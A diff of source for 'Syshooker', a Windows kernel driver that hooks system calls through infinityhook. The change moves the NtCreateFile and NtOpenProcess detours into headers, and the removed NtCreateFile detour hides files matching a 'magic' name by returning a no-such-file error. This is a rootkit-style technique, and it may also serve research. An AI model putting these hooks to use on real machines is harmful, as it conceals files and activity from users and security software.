@@ -19,8 +19,9 @@
 #include "infinityhook.h"
 #include "../Syshooker-Client/SyshookerCommon.h"
 
-static UNICODE_STRING StringNtCreateFile = RTL_CONSTANT_STRING(L"NtCreateFile");
-static NtCreateFile_t OriginalNtCreateFile = NULL;
+#include "NtCreateFile.h"
+#include "NtOpenProcess.h"
+
 
 static UNICODE_STRING StringNtWriteFile = RTL_CONSTANT_STRING(L"NtWriteFile");
 static NtWriteFile_t OriginalNtWriteFile = NULL;
@@ -31,15 +32,12 @@ static NtQueryDirectoryFile_t OriginalNtQueryDirectoryFile = NULL;
 static UNICODE_STRING StringNtQueryDirectoryFileEx = RTL_CONSTANT_STRING(L"NtQueryDirectoryFileEx");
 static NtQueryDirectoryFileEx_t OriginalNtQueryDirectoryFileEx = NULL;
 
-static UNICODE_STRING StringNtOpenProcess = RTL_CONSTANT_STRING(L"NtOpenProcess");
-static NtOpenProcess_t OriginalNtOpenProcess = NULL;
-
 UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");
 
 NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
-SyshookerSettings Settings = {L"ifh--", L"wassup", L"hideme"};
+//SyshookerSettings Settings = {L"ifh--", L"wassup", L"hideme"};
 
 /*
 *	The entry point of the driver. Initializes infinity hook and
@@ -216,65 +214,7 @@ void __fastcall SyscallStub(
 }
 
 // HERE: write the detour function
-/*
-*	This function is invoked instead of nt!NtCreateFile. It will 
-*	attempt to filter a file by the "magic" file name.
-*/
-NTSTATUS DetourNtCreateFile(
-	_Out_ PHANDLE FileHandle,
-	_In_ ACCESS_MASK DesiredAccess,
-	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
-	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
-	_In_opt_ PLARGE_INTEGER AllocationSize,
-	_In_ ULONG FileAttributes,
-	_In_ ULONG ShareAccess,
-	_In_ ULONG CreateDisposition,
-	_In_ ULONG CreateOptions,
-	_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
-	_In_ ULONG EaLength)
-{
-	//
-	// We're going to filter for our "magic" file name.
-	//
-	if (ObjectAttributes &&
-		ObjectAttributes->ObjectName && 
-		ObjectAttributes->ObjectName->Buffer)
-	{
-		//
-		// Unicode strings aren't guaranteed to be NULL terminated so
-		// we allocate a copy that is.
-		//
-		PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
 
-		if (ObjectName)
-		{
-			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
-			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
-		
-			//
-			// Does it contain our special file name?
-			//
-			if (wcsstr(ObjectName, Settings.NtCreateFileMagicName))
-			{
-				kprintf("[+] infinityhook: Denying access to file: %wZ.\n", ObjectAttributes->ObjectName);
-
-				ExFreePool(ObjectName);
-
-				//
-				// The demo denies access to said file.
-				//
-				return STATUS_NO_SUCH_FILE;
-			}
-
-			ExFreePool(ObjectName);
-		}
-	}
-
-	//
-	// We're uninterested, call the original.
-	//
-	return OriginalNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
-}
 
 // NtWriteFile Detour
 NTSTATUS DetourNtWriteFile(
@@ -940,22 +880,6 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 		}
 	}
 	return OriginalStatus;
-}
-
-NTSTATUS DetourNtOpenProcess(
-	_Out_ PHANDLE ProcessHandle,
-	_In_ ACCESS_MASK AccessMask,
-	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
-	_In_opt_ PCLIENT_ID ClientId)
-{
-	//kprintf("[+] infinityhook: NtOpenProcess: ClientIdPtr %p\n", ClientId);
-	if (ClientId != nullptr) {
-		kprintf("[+] infinityhook: NtOpenProcess: ClientId: %p %p\n", ClientId->UniqueProcess, ClientId->UniqueThread);
-	}
-	//
-	// call the original.
-	//
-	return OriginalNtOpenProcess(ProcessHandle, AccessMask, ObjectAttributes, ClientId);
 }
 
 NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
